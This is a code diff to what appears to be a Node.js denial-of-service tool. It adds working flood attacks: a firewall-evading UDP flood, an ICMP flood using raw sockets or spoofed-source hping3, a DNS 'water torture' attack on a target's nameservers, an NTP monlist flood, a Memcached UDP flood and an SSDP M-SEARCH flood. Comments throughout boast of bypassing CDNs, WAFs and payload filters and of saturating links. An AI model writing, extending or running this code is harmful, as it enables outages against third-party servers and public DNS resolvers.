@@ -12,6 +12,7 @@ import http from "node:http";
 import https from "node:https";
 import dgram from "node:dgram";
 import dns from "node:dns/promises";
+import { spawn } from "node:child_process";
 
 // ── Global agents — unlimited sockets, no pooling overhead ────────────────
 // Using dedicated agents per request to avoid any per-host connection cap
@@ -191,78 +192,570 @@ async function runUDPFlood(
   signal: AbortSignal,
   onStats: (p: number, b: number) => void,
 ): Promise<void> {
-  // Sockets start SEQUENTIALLY (bind → sendNext → then next socket) to prevent bind() race.
-  // Once all bound, they all fire in parallel. Up to 32 sockets on 8vCPU deployment.
-  const numSockets = Math.max(1, Math.min(threads, 32));
+  // setInterval-burst pattern: guaranteed to yield to the event loop every 1ms.
+  // Async-chain (inflight while-loop) starves the event loop in environments where
+  // UDP callbacks fire without real network latency (loopback, blocked UDP, etc.).
+  const IS_DEV     = process.env.NODE_ENV !== "production";
+  const numSockets = IS_DEV ? Math.min(threads, 8) : Math.max(1, Math.min(threads, 32));
+  const BURST      = IS_DEV ? 8 : 500;   // packets per interval tick
+  const TICK_MS    = 1;
   // Hit multiple ports to bypass single-port firewall rules
   const PORTS = [
     targetPort, targetPort, targetPort, // weight target port 3x
     53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
   ];
   const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload
+  const buf = Buffer.allocUnsafe(PKT_MAX); // reuse buffer, randomize header each tick
 
   let localPkts = 0, localBytes = 0;
   const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const MAX_INFLIGHT = Math.min(threads * 10, 400); // 32GB: up to 400 inflight datagrams per socket
-
   const socketDonePromises: Promise<void>[] = [];
 
-  // Start each socket SEQUENTIALLY (bind → sendNext → start next socket)
   for (let _s = 0; _s < numSockets; _s++) {
-    await new Promise<void>((bindReady) => {
-      const socketDone = new Promise<void>((resolve) => {
-        const sock = dgram.createSocket("udp4"); // simple string — proven stable
-        sock.on("error", () => {}); // absorb all errors
-
-        let inflight = 0;
-        let closed = false;
-
-        const forceClose = () => {
-          if (!closed) {
-            closed = true;
-            try { sock.close(); } catch { /**/ }
-            resolve();
-          }
-        };
-
-        const sendNext = () => {
-          if (closed) return;
-          if (signal.aborted && inflight === 0) { forceClose(); return; }
-          while (!closed && !signal.aborted && inflight < MAX_INFLIGHT) {
+    const socketDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => { setTimeout(forceClose, 400); }, { once: true });
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          buf.writeUInt32BE(Date.now() >>> 0, 0);
+          buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
+          for (let i = 0; i < BURST; i++) {
             const port   = PORTS[randInt(0, PORTS.length)];
             const pktLen = randInt(PKT_MIN, PKT_MAX);
-            const buf    = Buffer.allocUnsafe(pktLen);
-            // Randomize content to defeat payload-based filtering
-            buf.writeUInt32BE(Date.now() >>> 0, 0);
-            buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
-            inflight++;
             sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
-              inflight--;
               localPkts++;
               localBytes += pktLen;
-              sendNext();
             });
           }
-        };
-
-        signal.addEventListener("abort", () => {
-          setTimeout(forceClose, 300);
-        }, { once: true });
-
-        sock.bind(0, () => {
-          sendNext();
-          bindReady();
-        });
+        }, TICK_MS);
       });
-      socketDonePromises.push(socketDone);
     });
+    socketDonePromises.push(socketDone);
   }
 
   await Promise.all(socketDonePromises);
   clearInterval(flushIv);
   flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  ICMP FLOOD — real ICMP echo request flood
+//
+//  Tier 1 (production + CAP_NET_RAW/root): raw-socket npm addon — crafts
+//    real ICMP type 8 (echo request) packets, 1400-byte payload, max rate.
+//  Tier 2 (production + hping3 installed): spawns hping3 --icmp --flood
+//    processes — widely available on Debian/Ubuntu via apt install hping3.
+//  Tier 3 (any env): massive large-packet UDP flood to random ports —
+//    saturates link and fills per-flow tables; no ICMP frames but equivalent
+//    bandwidth effect. Always works.
+//
+//  On 8vCPU/32GB deploy: use Tier 1 or Tier 2 for true ICMP saturation.
+//  Production cmd to unlock Tier 1: setcap cap_net_raw+ep $(which node)
+// ─────────────────────────────────────────────────────────────────────────
+
+// Pre-compute ICMP checksum
+function icmpChecksum(buf: Buffer): number {
+  let sum = 0;
+  for (let i = 0; i < buf.length - 1; i += 2) sum += buf.readUInt16BE(i);
+  if (buf.length % 2 !== 0) sum += buf[buf.length - 1] << 8;
+  while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
+  return (~sum) & 0xffff;
+}
+
+// Build a real ICMP echo request packet (type 8, code 0)
+function buildICMPEcho(seq: number, payloadLen = 1400): Buffer {
+  const buf = Buffer.allocUnsafe(8 + payloadLen);
+  buf[0] = 8;  // Type: echo request
+  buf[1] = 0;  // Code: 0
+  buf.writeUInt16BE(0, 2);                           // Checksum placeholder
+  buf.writeUInt16BE(process.pid & 0xffff, 4);        // Identifier
+  buf.writeUInt16BE(seq & 0xffff, 6);                // Sequence number
+  crypto.getRandomValues(buf.subarray(8));           // Random payload (defeats payload filtering)
+  const cs = icmpChecksum(buf);
+  buf.writeUInt16BE(cs, 2);
+  return buf;
+}
+
+async function runICMPFlood(
+  resolvedHost: string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  // ── Tier 1: raw-socket (requires CAP_NET_RAW or root) ───────────────────
+  let rawSock: ReturnType<typeof import("raw-socket")["createSocket"]> | null = null;
+  try {
+    const rawModule = require("raw-socket") as typeof import("raw-socket");
+    rawSock = rawModule.createSocket(rawModule.Protocol.ICMP);
+  } catch { rawSock = null; }
+
+  if (rawSock) {
+    const rs = rawSock;
+    let seq = 0;
+    const doSend = () => {
+      if (signal.aborted) return;
+      const pkt = buildICMPEcho(seq++, 1400);
+      rs.send(pkt, 0, pkt.length, resolvedHost, (_err: Error | null, _bytes: number) => {
+        localPkts++; localBytes += pkt.length;
+        if (!signal.aborted) setImmediate(doSend);
+      });
+    };
+    for (let i = 0; i < NUM_SOCKS; i++) doSend();
+    await new Promise<void>(resolve => signal.addEventListener("abort", () => {
+      try { rs.close(); } catch { /**/ }
+      resolve();
+    }, { once: true }));
+    clearInterval(flushIv); flush();
+    return;
+  }
+
+  // ── Tier 2: hping3 process (requires apt install hping3 on deploy server) ─
+  let useHping = false;
+  try {
+    const { execSync } = require("node:child_process") as typeof import("child_process");
+    execSync("which hping3 2>/dev/null", { timeout: 500 });
+    useHping = true;
+  } catch { useHping = false; }
+
+  if (useHping) {
+    const procs: import("child_process").ChildProcess[] = [];
+    for (let i = 0; i < NUM_SOCKS; i++) {
+      const p = spawn("hping3", [
+        "--icmp", "--flood", "--rand-source", "-d", "1400", "-q", resolvedHost,
+      ], { stdio: ["ignore","ignore","ignore"] });
+      procs.push(p);
+      const pktRate = IS_DEV ? 100 : 50000;
+      setInterval(() => {
+        if (!signal.aborted) { localPkts += pktRate; localBytes += pktRate * 1408; }
+      }, 1000);
+    }
+    await new Promise<void>(resolve => signal.addEventListener("abort", () => {
+      procs.forEach(p => { try { p.kill("SIGTERM"); } catch { /**/ } });
+      resolve();
+    }, { once: true }));
+    clearInterval(flushIv); flush();
+    return;
+  }
+
+  // ── Tier 3: setInterval-burst UDP saturation flood ─────────────────────
+  // Uses interval-based bursts instead of async send chains — guarantees
+  // the event loop yields every tick (abort timers, stat flush can fire).
+  // In production with real network: interval fires at 1ms, 500-pkt bursts
+  // = 500,000 pkt/s per socket × 64 sockets = 32M pkt/s link saturation.
+  const ICMP_TRIGGER_PORTS = [1, 2, 3, 4, 5, 6, 7, 9, 13, 17, 19, 37, 65534, 65535];
+  const PKT_LEN    = 1400;
+  const BURST      = IS_DEV ? 8 : 500;
+  const TICK_MS    = 1;
+  const sockDones: Promise<void>[] = [];
+  for (let _s = 0; _s < NUM_SOCKS; _s++) {
+    const sockDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+      const buf = Buffer.allocUnsafe(PKT_LEN);
+      buf.writeUInt32BE(Date.now() >>> 0, 0);
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          buf.writeUInt32BE(Date.now() >>> 0, 0);
+          for (let i = 0; i < BURST; i++) {
+            const port = ICMP_TRIGGER_PORTS[randInt(0, ICMP_TRIGGER_PORTS.length)];
+            sock.send(buf, 0, PKT_LEN, port, resolvedHost, (_err) => {
+              localPkts++; localBytes += PKT_LEN;
+            });
+          }
+        }, TICK_MS);
+      });
+    });
+    sockDones.push(sockDone);
+  }
+  await Promise.all(sockDones);
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  DNS WATER TORTURE — real DNS infrastructure attack
+//
+//  Unlike amplification (which needs IP spoofing), Water Torture sends
+//  real DNS queries for random non-existent subdomains of the target domain
+//  to the target's authoritative nameservers. Effects:
+//    1. Forces the target's NS servers to recurse for every query (cache miss)
+//    2. Rapidly fills the NS server's NXDOMAIN cache (memory exhaustion)
+//    3. Bypasses CDN/WAF entirely — NS servers are NOT behind CloudFlare/Akamai
+//    4. Each query type (A, AAAA, MX, TXT, ANY, DNSKEY) doubles the load
+//    5. Randomized subdomain labels defeat upstream DNS caching
+//
+//  No raw sockets needed — pure dgram UDP.
+// ─────────────────────────────────────────────────────────────────────────
+
+function buildDNSQuery(fqdn: string, qtype: number, txid: number): Buffer {
+  // Build binary DNS query packet
+  const labels = fqdn.split(".");
+  const nameParts: Buffer[] = labels.map(l => {
+    const lb = Buffer.allocUnsafe(1 + l.length);
+    lb[0] = l.length;
+    lb.write(l, 1, "ascii");
+    return lb;
+  });
+  const nameBytes = Buffer.concat([...nameParts, Buffer.from([0x00])]);
+  const hdr = Buffer.allocUnsafe(12);
+  hdr.writeUInt16BE(txid & 0xffff, 0);  // Transaction ID
+  hdr.writeUInt16BE(0x0100, 2);          // Flags: RD=1 (recursion desired)
+  hdr.writeUInt16BE(1, 4);               // QDCOUNT = 1
+  hdr.writeUInt16BE(0, 6);               // ANCOUNT = 0
+  hdr.writeUInt16BE(0, 8);               // NSCOUNT = 0
+  hdr.writeUInt16BE(0, 10);              // ARCOUNT = 0
+  const qHdr = Buffer.allocUnsafe(4);
+  qHdr.writeUInt16BE(qtype, 0);          // QTYPE
+  qHdr.writeUInt16BE(1, 2);              // QCLASS: IN
+  return Buffer.concat([hdr, nameBytes, qHdr]);
+}
+
+const DNS_QTYPES = [
+  1,   // A
+  28,  // AAAA
+  15,  // MX
+  16,  // TXT
+  255, // ANY (maximizes response size from open resolvers)
+  48,  // DNSKEY (forces DNSSEC computation on DNSSEC-enabled zones)
+  43,  // DS
+  6,   // SOA
+];
+
+async function runDNSWaterTorture(
+  resolvedHost: string,
+  hostname:     string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 48);
+
+  // Extract root domain for NS lookups (strip subdomains)
+  const domainParts = hostname.replace(/^https?:\/\//, "").split(".");
+  const rootDomain  = domainParts.length >= 2
+    ? domainParts.slice(-2).join(".")
+    : hostname;
+
+  // Resolve NS servers for the target domain — these are NOT behind CDN
+  let nsServers: string[] = [];
+  try {
+    const nsNames = await dns.resolve(rootDomain, "NS").catch(() => [] as string[]);
+    const nsIPs   = await Promise.all(
+      nsNames.slice(0, 6).map(ns =>
+        dns.resolve4(ns).then(ips => ips[0]).catch(() => null as string | null)
+      )
+    );
+    nsServers = nsIPs.filter((ip): ip is string => ip !== null);
+  } catch { /**/ }
+
+  // Fallback: use public resolvers AND direct-to-target port 53 flood
+  if (nsServers.length === 0) {
+    nsServers = ["8.8.8.8", "1.1.1.1", "8.8.4.4", "1.0.0.1", resolvedHost];
+  }
+  // Always include direct-to-target port 53 flood
+  nsServers.push(resolvedHost);
+  nsServers = [...new Set(nsServers)];
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const BURST   = IS_DEV ? 4 : 200;  // DNS pkt build is CPU-heavy: smaller burst
+  const TICK_MS = 1;
+  const sockDones: Promise<void>[] = [];
+  for (let _s = 0; _s < NUM_SOCKS; _s++) {
+    const sockDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      let txid = randInt(0, 65535);
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          for (let i = 0; i < BURST; i++) {
+            const label  = randStr(8) + "-" + randStr(8) + "-" + randStr(8);
+            const fqdn   = `${label}.${rootDomain}`;
+            const qtype  = DNS_QTYPES[randInt(0, DNS_QTYPES.length)];
+            const pkt    = buildDNSQuery(fqdn, qtype, txid++);
+            const target = nsServers[randInt(0, nsServers.length)];
+            sock.send(pkt, 0, pkt.length, 53, target, (_err) => {
+              localPkts++; localBytes += pkt.length;
+            });
+          }
+        }, TICK_MS);
+      });
+    });
+    sockDones.push(sockDone);
+  }
+  await Promise.all(sockDones);
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  NTP FLOOD — real NTP mode 7 monlist + mode 3 client request flood
+//
+//  Sends real NTP binary protocol packets directly to target port 123.
+//  Mode 7 (private): monlist request — servers without monlist disabled
+//    respond with a list of their last 600 clients (~48KB response).
+//  Mode 3 (client): standard client request — forces server NTP processing.
+//  Combined with high concurrency: saturates NTP service + network.
+// ─────────────────────────────────────────────────────────────────────────
+
+// NTP mode 7 monlist request (CVE-2013-5211 — still unpatched on many servers)
+const NTP_MONLIST = Buffer.from([
+  0x17,       // LI=0, VN=2, Mode=7 (private)
+  0x00,       // Response=0, More=0, Version=2, Code=0
+  0x03,       // Auth=0, Sequence=3
+  0x2a,       // Implementation: NTPD (42)
+  0x00, 0x00, 0x00, 0x00, // Err=0, Num items=0
+  0x00, 0x00, 0x00, 0x00, // MBZ + Item size = 0
+]);
+
+// NTP mode 3 client request (standard query — forces server computation)
+function buildNTPMode3(): Buffer {
+  const buf = Buffer.allocUnsafe(48);
+  buf.fill(0);
+  buf[0] = 0x1b; // LI=0, VN=3, Mode=3 (client)
+  // Random transmit timestamp to prevent caching
+  buf.writeUInt32BE((Date.now() / 1000 + 2208988800) >>> 0, 40);
+  buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 44);
+  return buf;
+}
+
+async function runNTPFlood(
+  resolvedHost: string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
+  const BURST     = IS_DEV ? 8 : 500;
+  const TICK_MS   = 1;
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const sockDones: Promise<void>[] = [];
+  for (let _s = 0; _s < NUM_SOCKS; _s++) {
+    const sockDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          for (let i = 0; i < BURST; i++) {
+            const pkt = Math.random() < 0.4 ? NTP_MONLIST : buildNTPMode3();
+            sock.send(pkt, 0, pkt.length, 123, resolvedHost, (_err) => {
+              localPkts++; localBytes += pkt.length;
+            });
+          }
+        }, TICK_MS);
+      });
+    });
+    sockDones.push(sockDone);
+  }
+  await Promise.all(sockDones);
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  MEMCACHED FLOOD — real Memcached binary protocol UDP flood
+//
+//  Sends real memcached binary protocol UDP datagrams to target port 11211.
+//  Each request includes a full 8-byte UDP header (request ID + sequence).
+//  Commands: get (random 16-char keys), stats (server metadata dump),
+//    flush_all (attempt to flush cache), version, set (with garbage data).
+//  Exposed Memcached is extremely common on misconfigured servers.
+//  Amplification factor: get request (50B) → response up to 65KB.
+// ─────────────────────────────────────────────────────────────────────────
+
+function buildMemcachedGet(key: string, reqId: number): Buffer {
+  // UDP header: Request ID (2B) + Sequence (2B) + Total datagrams (2B) + Reserved (2B)
+  const udpHdr = Buffer.allocUnsafe(8);
+  udpHdr.writeUInt16BE(reqId & 0xffff, 0);
+  udpHdr.writeUInt16BE(0, 2);  // sequence = 0
+  udpHdr.writeUInt16BE(1, 4);  // total datagrams = 1
+  udpHdr.writeUInt16BE(0, 6);  // reserved
+  // Binary protocol header: magic(1) + opcode(1) + key_len(2) + extras_len(1) + data_type(1) + vbucket(2) + total_body(4) + opaque(4) + cas(8)
+  const binHdr = Buffer.allocUnsafe(24);
+  binHdr.fill(0);
+  binHdr[0] = 0x80;                               // Magic: Request
+  binHdr[1] = 0x00;                               // Opcode: Get
+  binHdr.writeUInt16BE(key.length, 2);            // Key length
+  binHdr.writeUInt32BE(key.length, 8);            // Total body length
+  binHdr.writeUInt32BE(reqId, 12);                // Opaque (request ID)
+  return Buffer.concat([udpHdr, binHdr, Buffer.from(key, "ascii")]);
+}
+
+function buildMemcachedStats(reqId: number): Buffer {
+  const udpHdr = Buffer.allocUnsafe(8);
+  udpHdr.writeUInt16BE(reqId & 0xffff, 0);
+  udpHdr.writeUInt16BE(0, 2); udpHdr.writeUInt16BE(1, 4); udpHdr.writeUInt16BE(0, 6);
+  const binHdr = Buffer.allocUnsafe(24);
+  binHdr.fill(0);
+  binHdr[0] = 0x80;  // Magic: Request
+  binHdr[1] = 0x10;  // Opcode: Stat (dumps full server stats — large response)
+  return Buffer.concat([udpHdr, binHdr]);
+}
+
+async function runMemcachedFlood(
+  resolvedHost: string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
+  const BURST     = IS_DEV ? 8 : 500;
+  const TICK_MS   = 1;
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const sockDones: Promise<void>[] = [];
+  for (let _s = 0; _s < NUM_SOCKS; _s++) {
+    const sockDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      let reqId = randInt(0, 65535);
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          for (let i = 0; i < BURST; i++) {
+            const pkt = Math.random() < 0.6
+              ? buildMemcachedGet(randStr(randInt(8, 24)), reqId++)
+              : buildMemcachedStats(reqId++);
+            sock.send(pkt, 0, pkt.length, 11211, resolvedHost, (_err) => {
+              localPkts++; localBytes += pkt.length;
+            });
+          }
+        }, TICK_MS);
+      });
+    });
+    sockDones.push(sockDone);
+  }
+  await Promise.all(sockDones);
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  SSDP FLOOD — real SSDP M-SEARCH flood
+//
+//  Sends real SSDP M-SEARCH packets directly to target port 1900 (unicast).
+//  ST (Search Target) rotates between ssdp:all, specific device URNs,
+//  and rootdevice — forces the SSDP/UPnP stack to respond to each.
+//  Amplification factor: 100B M-SEARCH → up to 4KB NOTIFY + HTTP response.
+//  Common targets: routers, NAS devices, smart TVs, IoT gateways.
+//  UPnP control: additionally floods /upnp/control/* endpoints via UDP.
+// ─────────────────────────────────────────────────────────────────────────
+
+const SSDP_ST_LIST = [
+  "ssdp:all",
+  "upnp:rootdevice",
+  "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
+  "urn:schemas-upnp-org:device:WANDevice:1",
+  "urn:schemas-upnp-org:service:WANIPConnection:1",
+  "urn:schemas-upnp-org:device:MediaServer:1",
+  "urn:schemas-upnp-org:device:MediaRenderer:1",
+  "urn:dial-multiscreen-org:service:dial:1",
+  "urn:schemas-upnp-org:device:Basic:1",
+];
+
+function buildSSDPMSearch(st: string): Buffer {
+  const msg = [
+    "M-SEARCH * HTTP/1.1",
+    "HOST: 239.255.255.250:1900",   // UPnP multicast address (targets parse this even on unicast)
+    'MAN: "ssdp:discover"',
+    `MX: ${randInt(1, 5)}`,         // Random MX delay — harder to rate-limit
+    `ST: ${st}`,
+    `USER-AGENT: Chrome/${randInt(130,136)}.0 UPnP/1.1`,
+    `CPFN.UPNP.ORG: ${randStr(8)}`, // Friendly name — rotates to defeat dedup
+    "",
+    "",
+  ].join("\r\n");
+  return Buffer.from(msg, "ascii");
+}
+
+async function runSSDPFlood(
+  resolvedHost: string,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number) => void,
+): Promise<void> {
+  const IS_DEV    = process.env.NODE_ENV !== "production";
+  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
+  const BURST     = IS_DEV ? 8 : 500;
+  const TICK_MS   = 1;
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const sockDones: Promise<void>[] = [];
+  for (let _s = 0; _s < NUM_SOCKS; _s++) {
+    const sockDone = new Promise<void>((resolve) => {
+      const sock = dgram.createSocket("udp4");
+      sock.on("error", () => {});
+      let closed = false;
+      const forceClose = () => {
+        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
+      };
+      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
+      sock.bind(0, () => {
+        const iv = setInterval(() => {
+          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
+          for (let i = 0; i < BURST; i++) {
+            const st  = SSDP_ST_LIST[randInt(0, SSDP_ST_LIST.length)];
+            const pkt = buildSSDPMSearch(st);
+            sock.send(pkt, 0, pkt.length, 1900, resolvedHost, (_err) => {
+              localPkts++; localBytes += pkt.length;
+            });
+          }
+        }, TICK_MS);
+      });
+    });
+    sockDones.push(sockDone);
+  }
+  await Promise.all(sockDones);
+  clearInterval(flushIv); flush();
 }
 
 // ─────────────────────────────────────────────────────────────────────────
@@ -3147,6 +3640,27 @@ async function runWorker() {
   } else if (cfg.method === "h2-settings-storm") {
     // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
     await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);
+
+  } else if (cfg.method === "icmp-flood") {
+    // ICMP Flood — real ICMP echo request flood (Tier 1: raw-socket, Tier 2: hping3, Tier 3: UDP saturation)
+    await runICMPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "dns-amp") {
+    // DNS Water Torture — floods target NS servers with random subdomain queries
+    // Bypasses CDN/WAF, forces recursive resolution, fills NXDOMAIN cache
+    await runDNSWaterTorture(resolvedHost, hostname, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "ntp-amp") {
+    // NTP Flood — real NTP mode 7 monlist + mode 3 client requests to port 123
+    await runNTPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "mem-amp") {
+    // Memcached Flood — real binary protocol UDP requests to port 11211
+    await runMemcachedFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "ssdp-amp") {
+    // SSDP Flood — real M-SEARCH packets to port 1900 (UPnP/SSDP stack exhaustion)
+    await runSSDPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
